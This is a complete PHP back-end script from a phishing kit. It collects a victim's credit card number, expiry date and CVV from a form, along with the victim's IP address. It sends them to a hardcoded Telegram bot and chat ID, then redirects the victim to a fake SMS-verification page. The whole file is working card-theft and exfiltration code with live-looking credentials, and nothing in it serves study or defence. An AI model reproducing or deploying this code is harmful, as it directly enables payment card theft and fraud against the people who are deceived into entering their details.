<?php
$cc = $_POST['1'] ; 
$exp = $_POST['2'] ; 
$expp = $_POST['3'] ; 
$cvv = $_POST['4'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 

 
$subject = "ASSUR CC | :   :) <3 : from: ".$ip;
$nome="ASSUR CARD " ; 
	$from="frt@huzrt.com" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ 🏙 💳 STARTED FROM THE BUTTON 💳 🏙+-----------------\r\n";
$message .= "CC NUMBER : ".$cc."\r\n";
$message .= "EXP Month : " .$exp."\r\n";
$message .= "EXP Year : " .$expp."\r\n";
$message .= "CVV : " .$cvv."\r\n";
$message .= "---------------+ VICTIM IP +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ ♻️  REBILLOTTE LX ♻️  +------------------\r\n";



 	$website="https://api.telegram.org/bot7639257483:AAH5zhtEQX43-rlQs8giyoyMZMUfaFvdGwk";
    $params=[
        'chat_id'=>'1514201446',
        'text'=>$message,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch); 


   $x=md5(microtime());$xx=sha1(microtime());


echo "<script> window.top.location.href = '../loadsms.html?cmd=_informations&session=".$x.$xx."';   </script>";

?>